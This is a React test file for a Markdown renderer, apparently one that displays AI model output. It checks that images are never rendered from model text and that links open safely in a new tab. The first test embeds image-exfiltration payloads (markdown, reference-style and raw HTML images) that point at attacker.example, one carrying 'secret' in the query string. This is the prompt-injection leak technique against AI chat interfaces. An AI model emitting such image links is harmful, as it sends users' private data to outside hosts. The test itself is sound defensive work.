import { render, screen } from "@testing-library/react";

import { Markdown } from "./Markdown";

describe("Markdown", () => {
  it("never renders images from model text", () => {
    const { container } = render(
      <Markdown>
        {
          'Here you go ![leak](https://attacker.example/?q=secret) and ![ref][r]\n\n[r]: https://attacker.example/r.png\n\n<img src="https://attacker.example/x.png">'
        }
      </Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("attacker.example");
    expect(container).toHaveTextContent("Here you go");
  });

  it("renders links that open safely in a new tab", () => {
    render(<Markdown>{"See [the recipe](https://www.thecocktaildb.com/drink/1)."}</Markdown>);
    const link = screen.getByRole("link", { name: "the recipe" });
    expect(link).toHaveAttribute("href", "https://www.thecocktaildb.com/drink/1");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noreferrer noopener");
  });
});
